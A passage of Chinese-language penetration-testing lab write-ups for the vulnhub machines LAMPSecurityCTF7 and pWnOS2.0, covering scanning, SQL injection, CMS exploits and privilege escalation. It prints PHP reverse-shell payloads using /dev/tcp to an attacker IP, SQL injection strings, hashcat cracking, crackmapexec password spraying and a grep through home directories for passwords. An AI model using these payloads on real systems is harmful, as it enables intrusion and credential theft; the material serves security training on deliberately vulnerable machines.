+<td><strong>要破解的****MD5 哈希值</strong>（可能是密码）</td>
+</tr>
+<tr>
+<td><code>/usr/share/wordlists/rockyou.txt</code></td>
+<td><strong>Kali 自带的****常用密码字典</strong>，包含 1400+ 万条真实泄露密码</td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140636862.png" alt="image-20251107203956786"></p>
+<p><strong>破解出密码：shannon</strong></p>
+<p><strong>首页有登录地址</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306528.png" alt="image-20251107210125602"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306529.png" alt="image-20251107210204525"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140638198.png" alt="image-20251107210239422"></p>
+<p><strong>登录成功，可能会****很慢</strong></p>
+<h2 id="利用-CMS-漏洞获取反弹-shell（也可以-RCE-了）"><a href="#利用-CMS-漏洞获取反弹-shell（也可以-RCE-了）" class="headerlink" title="利用 CMS 漏洞获取反弹 shell（也可以 RCE 了）"></a>利用 CMS 漏洞获取反弹 shell（也可以 RCE 了）</h2><p><strong>随便找个页面（也可以新建），写入 php 脚本反弹 shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.3/1234 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140640298.png" alt="image-20251107210902725"></p>
+<p><strong>监听对应端口，然后刷新一下对应的页面</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvpn 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140640305.png" alt="image-20251107210939269"></p>
+<h2 id="敏感文件提权"><a href="#敏感文件提权" class="headerlink" title="敏感文件提权"></a>敏感文件提权</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306530.png" alt="image-20251107211212360"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140640511.png" alt="image-20251107211306553"></p>
+<p><strong>500 多的这几个用户因该是可用的</strong></p>
+<p><strong>用户比较多的时候</strong>提权，我们可以试试在本地搜索到他们的<strong>历史记录</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140640662.png" alt="image-20251107211655608"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i pass /home/* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>**-R 递归   **</p>
+<p>**-i 忽略大小写  **</p>
+<p>**搜 pass 字符  **</p>
+<p><strong>搜用户，那么在 home 目录下</strong></p>
+<p><strong>把错误信息丢掉 2&gt;&#x2F;dev&#x2F;null</strong></p>
+<p><strong>刚才用过的</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306531.png" alt="image-20251107211923632"></p>
+<p><strong>还有****关键字</strong>，可以看一下这个文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306532.png" alt="image-20251107212022241"></p>
+<p><strong>可以试试看 是不是密码</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140643098.png" alt="image-20251107212222596"></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>这段记录是****从拿到低权 shell 到“偷渡”成 root 的完整逃逸过程</strong>，每一步都有典型意义，下面按时间线拆开说。</p>
+<hr>
+<ol>
+<li><code>bash-3.2$ sudo</code>  ** **直接敲 <code>sudo</code> 没带任何参数，GNU sudo 会提示 <code>-h</code> 需要参数，等于没跑起来。</li>
+<li><code>bash-3.2$ sud</code>  ** **手抖少打字母，bash 报 <code>command not found</code>，纯粹 typo。</li>
+<li><code>bash-3.2$ su -</code>  ** <strong>想切 root，但当前终端</strong>不是 TTY**（可能是通过 WebShell、反向 shell netcat 等进来的），**  ** **su 拒绝交互输入 → **<code>standard in must be a tty</code>。</li>
+<li><code>bash-3.2$ python -c &quot;import pty; pty.spawn(&#39;/bin/sh&#39;)&quot;</code>  ** <strong>经典</strong>升级交互式 TTY** 技巧：<ul>
+<li>**用 Python 的 **<code>pty</code> 模块重新分配一个伪终端；</li>
+<li>**成功后提示符变成 <strong><code>sh-3.2$</code>，现在有了“正常”终端。</strong>  ** <strong>这一步是 90% 低权 shell 必做的“tty 逃逸”。</strong></li>
+</ul>
+</li>
+<li><code>sh-3.2$ su</code>  ** <strong>再次执行 <code>su</code>，此时系统已认为它是</strong>终端设备**，可以交互输入密码。</li>
+<li>**输入密码 **<code>50$cent</code>  ** <strong>攻击者事先通过源码、配置文件、数据库或社工已拿到 root 口令；验证通过 →</strong>  ** <strong>提示符瞬间变成</strong>  ** <strong><code>[root@localhost ~]#</code>  ** <strong>完成</strong>垂直提权</strong>。</li>
+</ol>
+<hr>
+<p><strong>一句话总结</strong>  ** ****“没 TTY → Python 造 PTY → 再 su → 口令正确 → root 到手”**，整套流程在实战里几十秒就能完成，是红队最常用、最朴实的提权场景之一。</p>
+</blockquote>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<details><summary>什么是tty</summary>
+
+</details>
+</blockquote>
+<h3 id="定妆照"><a href="#定妆照" class="headerlink" title="定妆照"></a>定妆照</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140643289.png" alt="image-20251107213005936"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>**靶机难度适中，我们看到&#x2F;etc&#x2F;passwd 中有很多 bash 环境的用户，**<strong>很有可能有用户为了方便提权操作，会在自己的目录下存放有关提权的密码文件</strong>，思路在于对于含有 ”pass“ 字符串文件的搜索</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140643666.png" alt="image-20251107213112280"></p>
+<h1 id="LAMPSecurityCTF7-字符串魔法、密码喷射，这才是实战技术。"><a href="#LAMPSecurityCTF7-字符串魔法、密码喷射，这才是实战技术。" class="headerlink" title="LAMPSecurityCTF7 - 字符串魔法、密码喷射，这才是实战技术。"></a>LAMPSecurityCTF7 - 字符串魔法、密码喷射，这才是实战技术。</h1><p><strong>靶机精讲之 LAMPSecurityCTF7，vulnhub 靶机，涉及字符串操作和密码喷射，很实用的技术。中间还涉及 sql 注入和文件上传的细节操作，很需要基本功的一台靶机。可以盲打，比较我们的打法和细节，小小地 pk 一下。</strong></p>
+<h2 id="nmap-扫描-2"><a href="#nmap-扫描-2" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><p>** sudo nmap -sn ip&#x2F;24**</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306533.png" alt="image-20251108202722879"></p>
+<h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>** sudo nmap –min-rate 10000 -p- ip**</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140645603.png" alt="image-20251108202856073"></p>
+<h3 id="UDP-扫描-1"><a href="#UDP-扫描-1" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><p><strong>：sudo nmap -sU –top-port  20 ip    这里无端口开放</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306534.png" alt="image-20251108203247613"></p>
+<h3 id="详细信息扫描"><a href="#详细信息扫描" class="headerlink" title="详细信息扫描"></a>详细信息扫描</h3><p><strong>：sudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140645754.png" alt="image-20251108203436300"></p>
+<p><strong>10000 的 minniserv 渗透测试经常发现，是有漏洞的</strong></p>
+<h3 id="漏洞脚本扫描-1"><a href="#漏洞脚本扫描-1" class="headerlink" title="漏洞脚本扫描"></a>漏洞脚本扫描</h3><p><strong>sudo nmap –script&#x3D;vuln -p22—-10000 ip</strong></p>
+<p><strong>80 最优先</strong></p>
+<h2 id="Web-渗透-2"><a href="#Web-渗透-2" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p><strong>主页 80 页面</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140646941.png" alt="image-20251108203752774"></p>
+<p><strong>这样的地方都是可以试试 sql 的</strong></p>
+<p><code>&#39; or 1=1 -- </code>      这里没有</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140648316.png" alt="image-20251108203941255"></p>
+<h3 id="8080-SQL-注入"><a href="#8080-SQL-注入" class="headerlink" title="8080:SQL 注入"></a>8080:SQL 注入</h3><p><strong>有登录框就试试注入</strong><code>&#39; or 1=1 --</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306535.png" alt="image-20251108204035256"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140648782.png" alt="image-20251108204137828"></p>
+<p><strong>发现登录进来了,点点看看</strong></p>
+<p><strong>下面是较为有用的地方</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306536.png" alt="image-20251108204730017"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306537.png" alt="image-20251108204849212"></p>
+<p><strong>那就造一个反弹 shell 的脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim shell.php</span><br><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/本机ip/端口 0&gt;&amp;1&#x27;&quot;); ?&gt;</span><br><span class="line">本机监听端口:sudo nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140650737.png" alt="image-20251108205141017"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306538.png" alt="image-20251108205812216"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140650904.png" alt="image-20251108205541796"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306539.png" alt="image-20251108205554547"></p>
+<p><strong>上传成功，那怎么执行呢？就是怎么找具体路径</strong></p>
+<h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb url</span><br></pre></td></tr></table></figure>
+
+<h2 id="获得初始-shell-1"><a href="#获得初始-shell-1" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><p><strong>点一下我们的 shell.php 即可</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306540.png" alt="image-20251108205848869"></p>
+<p><strong>看当前用户的权限时提示我们没有 tty ，</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306541.png" alt="image-20251108210104405"></p>
+<p><strong>那就 python，一般都可以</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306542.png" alt="image-20251108210514040"></p>
+<p><strong>这里需要密码，我们没有，但这是一套****CMS</strong> 他肯定有<strong>数据库</strong>。找 <strong>web 目录</strong>下，数据库的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var/www目录下找</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306543.png" alt="image-20251108210806273"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306544.png" alt="image-20251108210732702"></p>
+<p><strong>可以看到连接****mysql 数据库</strong>的 <strong>root 密码为空</strong> 我们尝试连接 mysql 数据库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306545.png" alt="image-20251108211005789"></p>
+<p>** website 数据库—&gt; users 表**</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306546.png" alt="image-20251108211132719"></p>
+<p><strong>得到用户名和加密的密码</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306547.png" alt="image-20251108211346262"></p>
+<h2 id="密码破解-喷射"><a href="#密码破解-喷射" class="headerlink" title="密码破解 喷射"></a>密码破解 喷射</h2><p><strong>对数据做一些处理</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306548.png" alt="image-20251108211704834"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306549.png" alt="image-20251108211851730"></p>
+<p><strong>先看一下密码是什么类型的：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash identifier &#x27;字符串&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306550.png" alt="image-20251108212041129"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306551.png" alt="image-20251108212130188"></p>
+<p><strong>hashcat 破解：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 0 -a 0 要破解的文件 字典</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306552.png" alt="image-20251108212416157"></p>
+<p><strong>等待一段时间</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306553.png" alt="image-20251108212510352"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306554.png" alt="image-20251108212621564"></p>
+<p><strong>接下来可以用工具找，也可以自己看 hash 对应的密码对应的用户</strong></p>
+<h3 id="crackmapexec-碰撞大量用户名和密码"><a href="#crackmapexec-碰撞大量用户名和密码" class="headerlink" title="crackmapexec 碰撞大量用户名和密码"></a>crackmapexec 碰撞大量用户名和密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec ssh 10.10.10.24 -p 密码文件 -u 用户文件 --continue-on-success | grep &#x27;+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306555.png" alt="image-20251108212844671"></p>
+<blockquote>
+<p><strong>–continue-on-success 成功以后继续，便于找到全部匹配的用户名和密码</strong></p>
+<p><strong>| grep ‘+’  只有加号才显示，否则数据太多</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306556.png" alt="image-20251108214324126"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>获得用户名密码以后进行****切换账户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su 要切换的用户</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306558.png" alt="image-20251108213547353"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306559.png" alt="image-20251108213540708"></p>
+<p><strong>发现有(ALL)ALL</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>以超级用户的权限新启一个 bash 终端</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306560.png" alt="image-20251108213733059"></p>
+<h3 id="提权成功"><a href="#提权成功" class="headerlink" title="提权成功"></a>提权成功</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306561.png" alt="image-20251108213835783"></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p><strong>8080 端口后台登陆界面可以直接使用 sqlmap 进行攻击，从而直接爆破出用户和 hash 密码，再用 hashcat 进行解密，最后使用 CrackMapExec 工具进行密码喷射破解。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306562.png" alt="image-20251108214842816"></p>
+<p><strong>攻击链可以缩短：1. 在 8080 fuzz 登录框，发现数据库的报错回显，确定可以 error-based sqli，以及密码是 md5 hash 后存储 2.sqlmap 拿到用户表 3. hash 碰撞出一组密码 4. 登陆第一个用户 brian，发现可以 ssh 登陆，sudo -l 是 ALL，sudo -i 后结束。 fuzz 潜在的注入点是比较推荐的，像这台靶机存在 error-based sqli，就可以快速拿到 db 内的信息，如果是 blind injection 就会慢很多了。 在明确注入靶点后用 sqlmap，主要是因为这台靶机开的服务多，潜在的攻击点比较多，红队笔记的视频很少用 sqlmap，也可以手动注入试一试 视频里面的攻击链更有示范性，拿到了靶机上的 cms 管理权限，下一步做什么呢？上传 shell，包括但不限于直接上传，文章里嵌入 php code 等等</strong></p>
+<p>** 一般用在 vmware 中设置 NAT 网络连接模式会更好，当问你是拷贝还是移动时，最好选择移动，而不是传统的拷贝方式。用移动的方式网络环境会完整复现。**</p>
+<p><strong>这个靶机还存在一个敏感信息泄露的问题。当我们得到反弹 shell 的时候，它所在目录的上一级有一个 backups 的目录，目录里面有一个 mysql 的备份文件。它里面刚刚好就存在了数据库的插入数据的记录。</strong></p>
+<p><strong>扫描发现了一个 round cube，然后查询 roundcube webmail installer 里的创建 config，发现数据库账户密码都为 test；然后在 phpmyadmin 那里用 test 登录，再到 website 数据库中的 users 表，表中存在登录账户，提取名字，然后将表中密码进行检测发现是 md5 加密，进行 md5 解密后利用 ssh 登录，可以成功登录；最后测试发现可以直接提权 root 权限。</strong></p>
+<h1 id="pWnOS2-0-简洁明快的攻击链，php-mysql-架构-cms-渗透的样本。"><a href="#pWnOS2-0-简洁明快的攻击链，php-mysql-架构-cms-渗透的样本。" class="headerlink" title="pWnOS2.0 - 简洁明快的攻击链，php+mysql 架构 cms 渗透的样本。"></a>pWnOS2.0 - 简洁明快的攻击链，php+mysql 架构 cms 渗透的样本。</h1><p><strong>靶机精讲之 pWnOS2.0，vulnhub 靶机，简洁明快的攻击链，php+mysql 架构 cms 渗透的样本。从利用选择、反弹 shell 获得，到信息搜集和枚举，以及 mysql 数据库的翻找，都可以算上 php+mysql 架构 cms 渗透的标准靶机，很多更复杂的渗透也是在此基础上的展开的，这台靶机是可以深入思考，形成思维框架的靶机。</strong></p>
+<h2 id="nmap-扫描-3"><a href="#nmap-扫描-3" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><p><strong>主机发现</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn ip/24</span><br><span class="line">sudo nmap --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap -sT -sV -O -p探测出的端口,,, ip</span><br><span class="line">sudo nmap -sU --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap --script=vuln -p,,, ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306563.png" alt="image-20251110185810156"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306564.png" alt="image-20251110185856042"></p>
+<p><strong>UDP 没有开放</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306565.png" alt="image-20251110190052425"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306566.png" alt="image-20251110190039815"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306567.png" alt="image-20251110190837784"></p>
+<h2 id="Web-渗透-3"><a href="#Web-渗透-3" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p><strong>登录 80 页面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306568.png" alt="image-20251110190653186"></p>
+<p><strong>尝试 sql 注入</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306569.png" alt="image-20251110191016229"></p>
+<p><strong>虽然有注入，但被封堵了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306570.png" alt="image-20251110191033540"></p>
+<p><strong>注册界面也是</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306571.png" alt="image-20251110191108841"></p>
+<p><strong>他竟然有了注册，那注册以后干什么呢，之前简单目录爆破里有</strong><code>/blog</code> 的内容，那就看看（其实直接注册也行）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306572.png" alt="image-20251110191403094"></p>
+<p><strong>发现这个 blog 页面很像****内容管理系统</strong></p>
+<p><strong>有注入点随手测一下，这里应该没有</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306573.png" alt="image-20251110191730133"></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>看到内容管理系统就要****知道</strong>他是什么内容管理系统，通过他的 <strong>readme 文件</strong>，或者是<strong>源码文件</strong>，或者是他界面上显示出来的信息，判断出内容管理系统的<strong>名称和版本</strong>，看下有没有漏洞**	**</p>
+<p><strong>查看源码：一般看他的****注释，提示文件，版权标识</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306574.png" alt="image-20251110192048336"></p>
+<h2 id="CMS-漏洞利用"><a href="#CMS-漏洞利用" class="headerlink" title="CMS 漏洞利用"></a>CMS 漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 系统加版本</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306575.png" alt="image-20251110192129194"></p>
+<p><strong>能避免 metasploit 就不用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m 是镜像获取</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306576.png" alt="image-20251110192525564"></p>
+<p><strong>具体使用看 Usage</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306577.png" alt="image-20251110192642742"></p>
+<p><strong>这是****新建用户</strong>的指令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306578.png" alt="image-20251110193222757"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306579.png" alt="image-20251110193359091"></p>
+<p><strong>成功登录进靶机的 CMS 中</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306580.png" alt="image-20251110193425064"></p>
+<p><strong>这里貌似没法执行 php 代码</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306581.png" alt="image-20251110193630235"></p>
+<h2 id="文件上传的利用"><a href="#文件上传的利用" class="headerlink" title="文件上传的利用"></a>文件上传的利用</h2><p><strong>这里有个文件上传，可以试一下（先建一个占位的 php 文件，看看能不能上传）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306582.png" alt="image-20251110193718729"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306583.png" alt="image-20251110193935016"> <img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306584.png" alt="image-20251110193906580"></p>
+<p><strong>发现是可以上传的，那就写入****php 反弹 shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/本机地址/1234指定的监听端口 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306585.png" alt="image-20251110194225431"></p>
+<blockquote>
+<p><strong>前面的 bash 启 bash 环境，后面才是执行 shell 代码</strong></p>
+</blockquote>
+<details><summary>详细解释这条命令</summary>
+
+</details>
+
+
+<p><strong>上传这个 php 之后打开****监听</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><strong>那如何执行我们上传的 php 文件呢，一个是猜，一个是****直接爆破目录</strong>找具体地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306586.png" alt="image-20251110194551360"></p>
+<p><strong>访问对应的目录后，发现在****不停的加载</strong>，基本上就没问题了。连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306587.png" alt="image-20251110194617210"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306588.png" alt="image-20251110194713287"></p>
+<h2 id="获得初始-shell-2"><a href="#获得初始-shell-2" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306589.png" alt="image-20251110194930967"></p>
+<blockquote>
+<p><code>dpkg -l</code> 是 <strong>Debian&#x2F;Ubuntu 系</strong> 最常用的一条“低层”命令，用来 <strong>列出当前系统里所有已经安装的 <code>.deb</code> 软件包</strong>（包括已安装、已配置、半安装、待卸载等各种状态）。** **理解输出前，先记住 3 件事：</p>
+<ol>
+<li><strong>数据来源：</strong><code>/var/lib/dpkg/status</code></li>
+<li>**状态由 **<strong>3 个字母</strong> 组成：期望状态 &#x2F; 当前状态 &#x2F; 错误标志</li>
+<li>**不加任何参数时，会把 **<strong>全部包</strong> 按名字排序输出；配合管道可以当“系统软件清单”用。</li>
+</ol>
+</blockquote>
+<p><strong>看当前用户有哪些权限</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306590.png" alt="image-20251110195129663"></p>
+<p><strong>没有 tty 那就给他一个 python 的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306591.png" alt="image-20251110201138311"></p>
+<p><strong>因为我们是从 web CMS 这套内容管理系统进来的，那先看一下****数据库连接</strong>中有哪些文件，看看有没有<strong>泄漏的文件</strong></p>
+<p><strong>怎么找，要不就一级一级的目录往根目录看</strong></p>
+<p><strong>要不就搜 connect  config 之类的关键字，之前讲过</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306592.png" alt="image-20251110195551404"></p>
+<p><strong>这个就可以重点看一下</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306593.png" alt="image-20251110195754104"></p>
+<p><strong>发现确实有啊！</strong></p>
+<p><strong>直接****连接数据库</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306594.png" alt="image-20251110195901407"></p>
+<p><strong>报错，密码可能不对</strong></p>
+<p><strong>这里就涉及到****关键思路</strong>问题了</p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>我们的程序还在运行，而现在的数据库连接文件密码是错误的，这是不可能的，否则这套内容管理系统不可能跑 。那就说明没用这个 MySQL connect 文件，而是用的其他的（可能是这个旧密码），那就找找还有其他的相似文件吗</strong></p>
+</blockquote>
